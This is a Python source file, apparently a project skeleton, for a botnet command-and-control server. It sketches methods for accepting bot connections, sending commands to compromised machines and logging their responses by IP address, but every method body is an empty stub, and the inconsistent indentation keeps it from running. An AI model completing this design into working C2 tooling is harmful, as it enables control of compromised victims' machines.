#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket
	from time import sleep
	from subprocess import run, PIPE
	from os import devnull, _exit
	from sys import argv, exit
except ImportError as err:
	print(f"Error: {err}")
	
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

RESET = "\033[0m"
BOLD = "\033[01m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
    def __init__(self):
        self.windows_count = 0
        self.linux_count = 0
        self.windows_connections = {}
        self.linux_connections = {}
        
    def create_server_socket(self):
		"""This function will create a single server socket will accept
			incoming connections from bots.

			Arguments:
				None

			Returns:
				None			
		"""
        pass
    
    def send_cmd(self, sock_obj):
		"""This function will send the command to bots.

			Arguments:
				sock_obj (socket object): The server socket object to send command with.

			Returns:
				Will return the response generated by the executed command on the client machine.
		"""
        pass

	def write_response_output(self, response: str, ip_addr):
		"""This function will write the response generated by each machine in the botnet
			to a folder called "bots". The bots folder will contain files called by
			the IP addresses of compromised machine.

			Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.

			Returns:
				None
		"""
		with open("bots/" + ip_addr, 'a+') as botfile:
			pass
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	botnetObj = BotnetCmdCtrl()


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		try:
			exit(1)
		except SystemExit:
			_exit(1)